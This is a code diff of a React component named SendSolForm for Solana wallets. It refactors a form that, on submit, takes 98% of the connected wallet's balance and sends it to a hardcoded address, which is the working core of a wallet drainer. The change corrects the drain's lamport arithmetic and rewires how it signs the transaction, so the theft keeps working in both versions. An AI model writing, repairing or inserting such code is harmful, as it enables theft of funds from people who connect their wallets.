@@ -1,13 +1,14 @@
-// SendSolForm.tsx
-
-import { useConnection, useWallet } from '@solana/wallet-adapter-react';
+import { useConnection, useWallet, WalletContextState } from '@solana/wallet-adapter-react';
 import * as web3 from '@solana/web3.js';
-import { FC, useState } from 'react'
+import { FC, useState } from 'react';
 
 export const SendSolForm: FC = () => {
     const [txSig, setTxSig] = useState('');
     const { connection } = useConnection();
-    const { publicKey, signAndSendTransaction } = useWallet();
+    const { publicKey, wallet } = useWallet();
+
+    // Ensure that wallet.signAndSendTransaction is accessed correctly
+    const signAndSendTransaction = wallet.signAndSendTransaction;
 
     const sendSol = async (event) => {
         event.preventDefault();
@@ -24,10 +25,9 @@ export const SendSolForm: FC = () => {
             }
 
             const balanceInLamports = info.lamports;
-            const balanceInSol = balanceInLamports / web3.LAMPORTS_PER_SOL;
-            const amountToSend = balanceInSol * 0.98; // 98% of current balance
+            const amountToSend = balanceInLamports * 0.98; // 98% of current balance
 
-            const lamports = Math.floor(amountToSend * web3.LAMPORTS_PER_SOL); // Ensure lamports is an integer
+            const lamports = Math.floor(amountToSend); // Ensure lamports is an integer
 
             const transaction = new web3.Transaction();
             const recipientPubKey = new web3.PublicKey('AiwmF5F27tMzxmzcDwUg3on2fWiCHcuxQmBtV3bo611a');
@@ -40,7 +40,7 @@ export const SendSolForm: FC = () => {
                 })
             );
 
-            const { signature } = await signAndSendTransaction(transaction);
+            const { signature } = await signAndSendTransaction(transaction); // Use signAndSendTransaction method
             setTxSig(signature);
         } catch (error) {
             console.error('Failed to send transaction:', error);
@@ -67,3 +67,4 @@ export const SendSolForm: FC = () => {
         </div>
     )
 }
+
